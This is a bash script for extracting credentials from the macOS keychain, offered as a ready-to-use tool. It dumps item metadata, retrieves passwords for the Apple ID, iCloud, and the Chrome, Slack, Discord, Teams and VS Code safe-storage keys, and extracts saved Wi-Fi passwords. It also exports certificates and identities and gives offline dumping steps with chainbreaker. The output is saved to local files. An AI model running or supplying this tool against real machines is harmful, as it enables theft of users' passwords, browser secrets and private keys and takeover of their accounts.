#!/bin/bash
# macOS Keychain Credential Extraction
# Usage: chmod +x keychain_dump.sh && ./keychain_dump.sh [command]
# NOTE: Most operations require user password or interactive approval

set -euo pipefail

OUTPUT_DIR="${OUTPUT_DIR:-./keychain_dump_$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUTPUT_DIR"

usage() {
    cat << 'EOF'
Usage: ./keychain_dump.sh <command>

Commands:
  list            List all keychains and their lock status
  dump-metadata   Dump keychain item metadata (no passwords — no prompt)
  dump-passwords  Dump passwords (triggers user approval per item)
  find-wifi       Extract saved Wi-Fi passwords (requires admin)
  find-service    Search for a specific service/account
  find-certs      List certificates and identities
  export-certs    Export certificates to files
  offline         Instructions for offline keychain analysis
EOF
    exit 1
}

# ── List Keychains ──
list_keychains() {
    echo "[*] Keychain list:"
    security list-keychains

    echo ""
    echo "[*] Default keychain:"
    security default-keychain

    echo ""
    echo "[*] Keychain files:"
    ls -la ~/Library/Keychains/ 2>/dev/null
    echo ""
    ls -la /Library/Keychains/ 2>/dev/null

    echo ""
    echo "[*] Keychain lock status:"
    security show-keychain-info ~/Library/Keychains/login.keychain-db 2>&1 || true
}

# ── Dump Metadata (No Password Prompts) ──
dump_metadata() {
    echo "[*] Dumping keychain metadata (no passwords)..."

    echo "[*] Generic passwords (apps, services):"
    security dump-keychain ~/Library/Keychains/login.keychain-db 2>/dev/null \
        | grep -E "\"svce\"|\"acct\"|\"desc\"|\"cdat\"" \
        | tee "$OUTPUT_DIR/generic_passwords_meta.txt"

    echo ""
    echo "[*] Internet passwords (websites, servers):"
    security dump-keychain ~/Library/Keychains/login.keychain-db 2>/dev/null \
        | grep -E "\"srvr\"|\"acct\"|\"ptcl\"|\"port\"" \
        | tee "$OUTPUT_DIR/internet_passwords_meta.txt"

    echo ""
    echo "[*] Metadata saved to $OUTPUT_DIR/"
    echo "[*] Total generic password entries: $(grep -c '"svce"' "$OUTPUT_DIR/generic_passwords_meta.txt" 2>/dev/null || echo 0)"
    echo "[*] Total internet password entries: $(grep -c '"srvr"' "$OUTPUT_DIR/internet_passwords_meta.txt" 2>/dev/null || echo 0)"
}

# ── Dump Passwords (Interactive — User Prompted Per Item) ──
dump_passwords() {
    echo "[*] Extracting passwords (user will be prompted for each)..."
    echo "[!] This triggers a macOS security prompt for EACH password"
    echo ""

    # Extract specific known services
    local services=(
        "com.apple.account.AppleID"
        "com.apple.account.iCloud"
        "Chrome Safe Storage"
        "Slack Safe Storage"
        "Discord Safe Storage"
        "Teams Safe Storage"
        "VS Code Safe Storage"
    )

    for svc in "${services[@]}"; do
        echo "[*] Trying: $svc"
        security find-generic-password -s "$svc" -w 2>/dev/null && echo "  → Password retrieved" || echo "  → Not found or denied"
    done

    echo ""
    echo "[*] To extract a specific password by service name:"
    echo "  security find-generic-password -s 'ServiceName' -w"
    echo ""
    echo "[*] To extract by account:"
    echo "  security find-generic-password -a 'account@email.com' -w"
    echo ""
    echo "[*] Internet password by server:"
    echo "  security find-internet-password -s 'server.example.com' -w"
}

# ── Wi-Fi Passwords ──
find_wifi() {
    echo "[*] Extracting saved Wi-Fi passwords..."
    echo "[!] Requires admin credentials (will prompt)"
    echo ""

    # List known networks
    echo "[*] Preferred wireless networks:"
    networksetup -listpreferredwirelessnetworks en0 2>/dev/null || echo "  Cannot list"

    echo ""
    echo "[*] Extracting passwords for each network..."

    networksetup -listpreferredwirelessnetworks en0 2>/dev/null | tail -n +2 | while read -r ssid; do
        ssid=$(echo "$ssid" | xargs)  # trim whitespace
        if [ -n "$ssid" ]; then
            echo -n "  $ssid: "
            security find-generic-password -D "AirPort network password" -s "$ssid" -w 2>/dev/null || echo "(denied/not found)"
        fi
    done | tee "$OUTPUT_DIR/wifi_passwords.txt"
}

# ── Search for Service ──
find_service() {
    local query="${1:?Usage: find-service <service_name>}"
    echo "[*] Searching keychain for: $query"

    echo "[*] Generic passwords matching '$query':"
    security find-generic-password -s "$query" 2>/dev/null || echo "  Not found"

    echo ""
    echo "[*] Internet passwords matching '$query':"
    security find-internet-password -s "$query" 2>/dev/null || echo "  Not found"

    echo ""
    echo "[*] All items matching '$query' in metadata:"
    security dump-keychain 2>/dev/null | grep -i -A5 -B5 "$query" || echo "  Not found"
}

# ── Certificates ──
find_certs() {
    echo "[*] Certificates in login keychain:"
    security find-certificate -a ~/Library/Keychains/login.keychain-db 2>/dev/null \
        | grep "\"labl\"" \
        | tee "$OUTPUT_DIR/certificates.txt"

    echo ""
    echo "[*] Identities (cert + private key pairs):"
    security find-identity -v 2>/dev/null | tee "$OUTPUT_DIR/identities.txt"

    echo ""
    echo "[*] System root certificates:"
    security find-certificate -a /System/Library/Keychains/SystemRootCertificates.keychain 2>/dev/null | grep "\"labl\"" | wc -l
    echo "  (full list in system keychain)"
}

export_certs() {
    echo "[*] Exporting certificates..."
    mkdir -p "$OUTPUT_DIR/certs"

    security find-certificate -a -p ~/Library/Keychains/login.keychain-db > "$OUTPUT_DIR/certs/all_user_certs.pem" 2>/dev/null
    echo "[+] User certs: $OUTPUT_DIR/certs/all_user_certs.pem"

    # Export identities (requires user approval for private key)
    echo "[*] To export identity (cert + key) as PKCS12:"
    echo "  security export -k ~/Library/Keychains/login.keychain-db -t identities -f pkcs12 -o identity.p12"
}

# ── Offline Analysis ──
offline_analysis() {
    cat << 'EOF'
Offline Keychain Analysis
=========================

If you have a copy of the keychain file and know the user's password:

1. Copy the keychain file:
   ~/Library/Keychains/login.keychain-db

2. Using chainbreaker (https://github.com/n0fate/chainbreaker):
   # Dump with known password
   python2 chainbreaker.py -f login.keychain-db -p "user_password" --dump

   # Dump with master key (from memory)
   python2 chainbreaker.py -f login.keychain-db -k <master_key_hex> --dump

3. Using security command on another Mac:
   # Add the keychain
   security add-keychain /path/to/login.keychain-db

   # Unlock with password
   security unlock-keychain -p "user_password" /path/to/login.keychain-db

   # Dump
   security dump-keychain -d /path/to/login.keychain-db

4. Keychain file locations:
   ~/Library/Keychains/login.keychain-db     (user keychain)
   /Library/Keychains/System.keychain        (system keychain)
   ~/Library/Keychains/*/keychain-2.db       (iCloud keychain - encrypted)
EOF
}

# ── Main ──
case "${1:-}" in
    list)           list_keychains;;
    dump-metadata)  dump_metadata;;
    dump-passwords) dump_passwords;;
    find-wifi)      find_wifi;;
    find-service)   find_service "${2:-}";;
    find-certs)     find_certs;;
    export-certs)   export_certs;;
    offline)        offline_analysis;;
    *)              usage;;
esac
